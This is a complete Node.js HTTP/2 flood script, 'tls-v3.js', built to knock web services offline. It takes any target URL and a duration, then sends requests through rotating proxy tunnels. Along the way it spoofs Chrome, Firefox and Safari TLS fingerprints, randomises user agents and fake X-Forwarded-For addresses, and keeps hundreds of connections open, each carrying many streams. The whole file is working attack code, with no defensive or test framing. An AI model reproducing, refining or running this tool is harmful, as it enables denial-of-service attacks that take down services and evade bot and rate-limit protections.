#!/usr/bin/env node
// tls-v3.js — HTTP/2 multiplex flood (enhanced from tls-v2)
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs      = require('fs');
const url     = require('url');
const http    = require('http');
const tls     = require('tls');
const crypto  = require('crypto');
const http2   = require('http2');

// ─────────────────────────── CLI ───────────────────────────
// node tls-v3.js <target> <seconds> [--conn N] [--streams N] [--proxies f] [--ua f] [--profile chrome|firefox|safari|random]
const argv = process.argv.slice(2);
if (argv.length < 2) {
  console.log('Usage: node tls-v3.js <url> <seconds> [--conn 500] [--streams 32] [--proxies proxy.txt] [--ua ua.txt] [--profile random]');
  process.exit(1);
}
const TARGET   = argv[0];
const DURATION = parseInt(argv[1], 10) || 60;
const flag = (n, d) => { const i = argv.indexOf('--' + n); return i !== -1 && argv[i + 1] ? argv[i + 1] : d; };

const PROXY_FILE = flag('proxies', 'proxy.txt');
const UA_FILE    = flag('ua', 'ua.txt');
const MAX_CONN   = parseInt(flag('conn', '500'), 10);
const STREAMS    = parseInt(flag('streams', '32'), 10);
const PROFILE    = flag('profile', 'random');

// ─────────────────────────── Load assets ───────────────────────────
let proxies = [];
try {
  proxies = fs.readFileSync(PROXY_FILE, 'utf-8').replace(/\r/g, '').split('\n').filter(l => l.trim());
} catch {
  console.log('proxy file not found: ' + PROXY_FILE);
  process.exit(1);
}
if (!proxies.length) { console.log('proxy.txt empty'); process.exit(1); }

let UAs = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'];
try {
  const loaded = fs.readFileSync(UA_FILE, 'utf-8').replace(/\r/g, '').split('\n').filter(l => l.trim());
  if (loaded.length) UAs = loaded;
} catch { /* default UA */ }

const parsed = url.parse(TARGET);
if (!parsed.hostname) { console.log('bad target url'); process.exit(1); }
const PORT = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);

// ─────────────────────────── TLS fingerprints ───────────────────────────
const PROFILES = {
  chrome: {
    ciphers:
      'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:' +
      'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:' +
      'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:' +
      'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:' +
      'ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs:
      'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:' +
      'ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:' +
      'rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curve: 'X25519:P-256:P-384',
  },
  firefox: {
    ciphers:
      'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:' +
      'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:' +
      'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:' +
      'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:' +
      'ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:' +
      'AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs:
      'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:' +
      'rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:' +
      'rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
    curve: 'X25519:P-256:P-384:P-521',
  },
  safari: {
    ciphers:
      'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:' +
      'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:' +
      'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:' +
      'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:' +
      'ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs:
      'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:' +
      'ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:' +
      'rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curve: 'X25519:P-256:P-384',
  },
};
const pickProfile = () => PROFILE === 'random'
  ? PROFILES[['chrome', 'firefox', 'safari'][Math.floor(Math.random() * 3)]]
  : (PROFILES[PROFILE] || PROFILES.chrome);

const SECURE_OPTS =
  crypto.constants.SSL_OP_NO_RENEGOTIATION |
  crypto.constants.SSL_OP_NO_TICKET        |
  crypto.constants.SSL_OP_NO_SSLv2         |
  crypto.constants.SSL_OP_NO_SSLv3         |
  crypto.constants.SSL_OP_NO_COMPRESSION   |
  crypto.constants.SSL_OP_ALL              |
  crypto.constants.SSL_OP_TLSEXT_PADDING;

// ─────────────────────────── HTTP/2 SETTINGS ───────────────────────────
const H2_SETTINGS = {
  enablePush: false,
  maxConcurrentStreams: 1000,
  initialWindowSize: 6291456,
  maxHeaderListSize: 262144,
  maxFrameSize: 16384,
};

// ─────────────────────────── Helpers ───────────────────────────
const rand = (n = 8) => crypto.randomBytes(n).toString('hex');
const randPath = () => {
  const base = parsed.path && parsed.path !== '/' ? parsed.path : '/';
  return base + (base.includes('?') ? '&' : '?') + '_=' + rand(8);
};

const randHeaders = (ua) => ({
  ':method': 'GET',
  ':path': randPath(),
  ':scheme': parsed.protocol === 'https:' ? 'https' : 'http',
  ':authority': parsed.host,
  'user-agent': ua,
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'en-US,en;q=0.9,id;q=0.8',
  'cache-control': 'no-cache, no-store, max-age=0, must-revalidate',
  'pragma': 'no-cache',
  'referer': Math.random() < 0.5 ? parsed.href : 'https://' + parsed.host + '/',
  'sec-ch-ua': '"Chromium";v="120", "Not_A Brand";v="8"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
});

// ─────────────────────────── Proxy health tracker ───────────────────────────
const proxyHealth = new Map();
const pickProxy = () => {
  for (let i = 0; i < 12; i++) {
    const line = proxies[Math.floor(Math.random() * proxies.length)];
    const h = proxyHealth.get(line);
    if (!h || h.fails < 5 || Date.now() - h.lastFail > 30000) return line;
  }
  return proxies[Math.floor(Math.random() * proxies.length)];
};
const markFail = (line) => {
  const h = proxyHealth.get(line) || { fails: 0, lastFail: 0 };
  h.fails++; h.lastFail = Date.now();
  proxyHealth.set(line, h);
};
const markOk = (line) => {
  const h = proxyHealth.get(line);
  if (h) h.fails = 0;
};

// ─────────────────────────── Stats ───────────────────────────
let reqCount = 0, errCount = 0, activeSockets = 0;
const statsTimer = setInterval(() => {
  process.stdout.write(`\r[RPS] ${reqCount}/s  err=${errCount}  socks=${activeSockets}   `);
  reqCount = 0; errCount = 0;
}, 1000);

// ─────────────────────────── HTTP/2 tunnel ───────────────────────────
function http2Tunnel(rawSocket, proxyLine) {
  const prof = pickProfile();
  const ua   = UAs[Math.floor(Math.random() * UAs.length)];

  let session;
  try {
    session = http2.connect(parsed.href, {
      createConnection: () => tls.connect({
        socket: rawSocket,
        host: parsed.hostname,
        servername: parsed.hostname,
        port: PORT,
        ciphers: prof.ciphers,
        sigalgs: prof.sigalgs,
        ecdhCurve: prof.curve,
        secureOptions: SECURE_OPTS,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
      }),
      settings: H2_SETTINGS,
    });
  } catch (e) {
    errCount++;
    try { rawSocket.destroy(); } catch {}
    return;
  }

  activeSockets++;

  let closed = false;
  const close = () => {
    if (closed) return;
    closed = true;
    activeSockets--;
    try { session.destroy(); } catch {}
    try { rawSocket.destroy(); } catch {}
  };

  session.on('error', () => { errCount++; close(); });
  session.on('close', close);
  session.on('goaway', close);
  rawSocket.on('error', () => { errCount++; close(); });
  rawSocket.on('close', close);

  // PING keep-alive
  const pingTimer = setInterval(() => {
    try { session.ping(() => {}); } catch { clearInterval(pingTimer); }
  }, 15000);
  session.on('close', () => clearInterval(pingTimer));

  // Stream refill loop
  const fireStream = () => {
    if (closed) return;
    let stream;
    try {
      stream = session.request(randHeaders(ua), { endStream: true });
    } catch (e) {
      errCount++;
      if (!closed) setTimeout(fireStream, 5);
      return;
    }
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      if (!closed) setImmediate(fireStream);
    };
    stream.on('response', () => { reqCount++; });
    stream.on('error', () => { errCount++; try { stream.close(); } catch {} finish(); });
    stream.on('close', finish);
    try { stream.end(); } catch { finish(); }
  };

  markOk(proxyLine);
  for (let i = 0; i < STREAMS; i++) setImmediate(fireStream);
}

// ─────────────────────────── Proxy CONNECT tunnel ───────────────────────────
const agent = new http.Agent({
  keepAlive: true,
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
});
const CONNECT_TIMEOUT = 10000;

function spawnTunnel() {
  if (activeSockets >= MAX_CONN) return;

  const line = pickProxy();
  const [ph, pp] = line.split(':');
  if (!ph || !pp) return;

  let req;
  try {
    req = http.request({
      host: ph,
      port: parseInt(pp, 10),
      method: 'CONNECT',
      path: `${parsed.hostname}:${PORT}`,
      agent,
      timeout: CONNECT_TIMEOUT,
      headers: {
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
        'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
      },
    });
  } catch {
    markFail(line);
    return;
  }

  req.on('connect', (_res, socket) => {
    socket.setNoDelay(true);
    socket.setKeepAlive(true, 1000);
    socket.setTimeout(30000);
    http2Tunnel(socket, line);
  });
  req.on('timeout', () => { errCount++; markFail(line); try { req.destroy(); } catch {} });
  req.on('error', () => { errCount++; markFail(line); });
  req.end();
}

// ─────────────────────────── Runner ───────────────────────────
const runnerTimer = setInterval(() => {
  const missing = MAX_CONN - activeSockets;
  if (missing <= 0) return;
  const burst = Math.min(missing, 50);
  for (let i = 0; i < burst; i++) spawnTunnel();
}, 50);

// ─────────────────────────── Shutdown ───────────────────────────
const stop = (signal) => {
  clearInterval(runnerTimer);
  clearInterval(statsTimer);
  process.stdout.write('\n');
  console.log(`[*] ${signal} — stopped. active sockets drained.`);
  process.exit(0);
};
process.on('SIGINT', () => stop('SIGINT'));
process.on('SIGTERM', () => stop('SIGTERM'));
process.on('uncaughtException', () => { errCount++; });
process.on('unhandledRejection', () => { errCount++; });

setTimeout(() => {
  clearInterval(runnerTimer);
  clearInterval(statsTimer);
  process.stdout.write('\n');
  console.log(`[*] duration ${DURATION}s reached, exiting`);
  process.exit(0);
}, DURATION * 1000);

console.log(`[+] target=${parsed.href}  conn=${MAX_CONN}  streams/session=${STREAMS}  profile=${PROFILE}`);
console.log(`[+] proxies=${proxies.length}  uas=${UAs.length}  duration=${DURATION}s`);